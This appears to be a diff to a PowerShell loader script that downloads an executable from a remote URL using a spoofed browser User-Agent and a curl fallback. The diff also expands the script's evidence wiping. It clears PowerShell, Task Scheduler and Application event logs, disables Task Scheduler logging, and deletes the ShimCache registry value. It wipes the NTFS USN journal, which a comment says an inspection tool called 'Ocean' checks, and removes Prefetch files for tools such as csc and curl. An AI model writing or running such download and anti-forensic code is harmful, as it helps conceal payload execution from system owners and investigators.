@@ -180,14 +180,14 @@ try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $wc.DownloadFile($EXE_URL, $EXE_PATH)
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 500000)) {
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 4000)) {
         $downloaded = $true
     }
 } catch {}
 
 if (-not $downloaded) {
     & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 500000)) {
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 4000)) {
         $downloaded = $true
     }
 }
@@ -330,13 +330,30 @@ if (Test-Path $conHistory) {
     try { [System.IO.File]::WriteAllText($conHistory, '') } catch {}
 }
 
-# 3. Clear PowerShell Operational & ScriptBlock Event Logs (Event ID 4104 / 4103)
+# 3. Disable and Wipe Event Viewer Logs (Event ID 4104 / 4103 / 106 / 200 / 201)
 try {
-    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Operational")
+    $evSession = [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession
+    $targetLogs = @(
+        "Microsoft-Windows-PowerShell/Operational",
+        "Windows PowerShell",
+        "Microsoft-Windows-TaskScheduler/Operational",
+        "Microsoft-Windows-TaskScheduler/Maintenance",
+        "Application"
+    )
+    foreach ($logName in $targetLogs) {
+        try { $evSession.ClearLog($logName) } catch {}
+    }
 } catch {}
-try {
-    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Windows PowerShell")
-} catch {}
+
+# wevtutil hard wipe & disable operational noise
+cmd /c "wevtutil sl Microsoft-Windows-TaskScheduler/Operational /e:false >nul 2>nul"
+cmd /c "wevtutil cl Microsoft-Windows-TaskScheduler/Operational >nul 2>nul"
+cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
+cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
+cmd /c "wevtutil cl Application >nul 2>nul"
+
+# Flush ShimCache / AppCompatCache
+cmd /c "reg delete `"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`" /v AppCompatCache /f >nul 2>nul"
 
 # 4. Wipe NTFS USN Change Journal (Destroys deleted file history checked by Ocean)
 cmd /c "fsutil usn deletejournal /d /n $env:SystemDrive >nul 2>nul"
@@ -397,7 +414,7 @@ if (Test-Path $bamUserRoot) {
 $prefetchDir = "$env:SystemRoot\Prefetch"
 if (Test-Path $prefetchDir) {
     Get-ChildItem -Path $prefetchDir -Filter "*.pf" -ErrorAction SilentlyContinue | Where-Object {
-        $_.Name -match "SYSTEMNETWORK|PERFHOST|L4G|SYSCHECK"
+        $_.Name -match "SYSTEMNETWORK|PERFHOST|L4G|SYSCHECK|CSC|CVTRES|CURL"
     } | Remove-Item -Force -ErrorAction SilentlyContinue
 }
 
